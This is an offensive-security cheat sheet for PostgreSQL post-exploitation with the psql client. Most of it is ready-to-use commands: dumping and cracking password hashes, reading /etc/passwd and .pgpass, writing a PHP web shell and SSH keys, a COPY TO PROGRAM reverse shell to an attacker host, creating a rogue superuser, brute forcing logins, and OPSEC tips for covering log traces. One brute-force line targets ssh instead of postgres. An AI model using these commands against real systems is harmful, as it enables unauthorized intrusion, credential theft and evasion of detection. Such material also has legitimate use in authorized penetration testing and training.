# psql

**Tags:** `#psql` `#postgresql` `#database` `#postexploitation` `#enumeration` `#rce` `#fileread`

PostgreSQL interactive CLI client. Post-exploitation: enumerate databases and credentials, extract MD5/SCRAM password hashes, read files via `COPY FROM`, write files and webshells via `COPY TO`, and execute OS commands via `COPY TO PROGRAM` (PostgreSQL 9.3+) or custom extensions. Pre-installed on Kali.

**Source:** Pre-installed on Kali
**Install:** `sudo apt install postgresql-client`

```bash
# Connect to remote PostgreSQL
psql -h 192.168.1.10 -U postgres -p 5432

# Connect with password
PGPASSWORD=Password psql -h 192.168.1.10 -U postgres
```

> [!note] **`COPY TO PROGRAM`** — PostgreSQL's most powerful post-exploitation primitive. If you have a superuser account (or `pg_execute_server_program` role in PG 11+), `COPY TO PROGRAM` executes arbitrary OS commands as the postgres service account. No UDF compilation required.

---

## Connecting

```bash
# Remote connection
psql -h 192.168.1.10 -U postgres -p 5432

# With password in env (avoid shell history)
PGPASSWORD=Password psql -h 192.168.1.10 -U postgres

# Connect to specific database
psql -h 192.168.1.10 -U postgres -d targetdb

# Connection string format
psql "postgresql://postgres:Password@192.168.1.10:5432/postgres"

# Execute single query and exit
psql -h 192.168.1.10 -U postgres -c "SELECT version();"

# Execute from file
psql -h 192.168.1.10 -U postgres -f queries.sql

# Through proxy
PGPASSWORD=Password proxychains psql -h 192.168.1.10 -U postgres
```

---

## Reconnaissance

```sql
-- Current user and version
SELECT current_user;
SELECT version();

-- Check if superuser
SELECT current_setting('is_superuser');
-- or
SELECT usesuper FROM pg_user WHERE usename = current_user;

-- List all databases
\l
SELECT datname FROM pg_database;

-- List schemas in current DB
\dn
SELECT schema_name FROM information_schema.schemata;

-- List tables
\dt
\dt schema.*
SELECT tablename FROM pg_tables WHERE schemaname = 'public';

-- Describe table
\d tablename

-- List users and roles
\du
SELECT usename, usesuper, usecreatedb FROM pg_user;

-- List all roles
SELECT rolname, rolsuper, rolcreaterole FROM pg_roles;

-- Switch database
\c targetdb
```

---

## Credential Extraction

```sql
-- Dump all user hashes (requires superuser)
SELECT usename, passwd FROM pg_shadow;

-- Modern PostgreSQL — SCRAM-SHA-256 hashes
-- Format: SCRAM-SHA-256$<iterations>:<salt>$<storedkey>:<serverkey>

-- Older PostgreSQL — MD5 hashes
-- Format: md5<hash>  (hash = md5(password + username))
```

```bash
# Crack PostgreSQL MD5 hashes — hashcat mode 28200
# Format: postgres:md5<hash>
hashcat -m 28200 pg_hashes.txt /usr/share/wordlists/rockyou.txt

# Crack SCRAM-SHA-256 — hashcat mode 28400
hashcat -m 28400 pg_hashes.txt /usr/share/wordlists/rockyou.txt
```

---

## File Read

```sql
-- Read file via COPY (requires superuser or pg_read_server_files role)
CREATE TABLE filecontent (data TEXT);
COPY filecontent FROM '/etc/passwd';
SELECT * FROM filecontent;
DROP TABLE filecontent;

-- One-liner
COPY (SELECT pg_read_file('/etc/passwd')) TO STDOUT;

-- pg_read_file (superuser only, size limit applies)
SELECT pg_read_file('/etc/passwd');
SELECT pg_read_file('/var/lib/postgresql/.pgpass');
```

---

## File Write — Web Shell

```sql
-- Write file (requires superuser or pg_write_server_files role)
COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/html/shell.php';

-- Write SSH authorized_keys (if postgres user has home dir)
COPY (SELECT 'ssh-rsa AAAAB3N...') TO '/var/lib/postgresql/.ssh/authorized_keys';

-- Find writable paths
SHOW data_directory;
```

---

## OS Command Execution — COPY TO PROGRAM

PostgreSQL 9.3+ — requires superuser or `pg_execute_server_program` role (PG 11+).

```sql
-- Execute OS command
COPY (SELECT '') TO PROGRAM 'id > /tmp/out.txt';
COPY (SELECT '') TO PROGRAM 'whoami';

-- Reverse shell
COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"';

-- Add SSH key
COPY (SELECT '') TO PROGRAM 'mkdir -p /var/lib/postgresql/.ssh && echo "ssh-rsa AAAA..." >> /var/lib/postgresql/.ssh/authorized_keys';

-- Check OS user
COPY (SELECT '') TO PROGRAM 'id > /tmp/pg_id.txt';
COPY filecontent FROM '/tmp/pg_id.txt';
SELECT * FROM filecontent;
```

---

## Privilege Escalation

```sql
-- Check current privileges
SELECT current_setting('is_superuser');
SHOW search_path;

-- If you have CREATEROLE — create a superuser
CREATE ROLE hacker SUPERUSER LOGIN PASSWORD 'hacker';

-- If you have a function with SECURITY DEFINER owned by superuser
-- Look for vulnerable functions
SELECT proname, prosecdef, proowner::regrole
  FROM pg_proc WHERE prosecdef = true;

-- Grant superuser to self (if you can create roles)
ALTER USER current_user WITH SUPERUSER;
```

---

## CVE-based Attacks

```bash
# PostgreSQL 9.3-11.1 — CVE-2019-9193 (COPY TO PROGRAM — just the feature, not a vuln per se)
# Requires superuser — but often misconfigured

# RCE via extension loading (requires superuser + writable lib path)
```

```sql
-- Load custom extension (requires superuser, extension .so in lib path)
CREATE EXTENSION IF NOT EXISTS "uuid-ossp";
SELECT * FROM pg_available_extensions;
```

---

## Useful psql Shell Commands

```
\q              -- quit
\l              -- list databases
\c <db>         -- connect to database
\dt             -- list tables
\d <table>      -- describe table
\du             -- list users/roles
\dn             -- list schemas
\df             -- list functions
\timing         -- toggle query timing
\! <cmd>        -- run local shell command (on attacker)
\copy           -- client-side COPY (runs on client, not server)
\o /tmp/out     -- redirect output to file
\i file.sql     -- execute SQL file
```

---

## Brute Force

```bash
# Hydra
hydra -l postgres -P /usr/share/wordlists/rockyou.txt postgres://192.168.1.10

# Medusa
medusa -h 192.168.1.10 -u postgres -P /usr/share/wordlists/rockyou.txt -M postgres

# NetExec
netexec ssh 192.168.1.10 -u postgres -P /usr/share/wordlists/rockyou.txt
```

---

## OPSEC Notes

- PostgreSQL logs connections and queries to `pg_log/` — location via `SHOW log_directory;`
- `COPY TO PROGRAM` leaves command execution in PostgreSQL logs if `log_min_duration_statement` is set
- Writing files via COPY leaves disk artifacts — clean up
- Default `pg_hba.conf` often allows local connections without password — check for local socket access if on the host

---

*Created: 2026-03-06*
*Updated: 2026-03-06*
*Model: claude-sonnet-4-6*
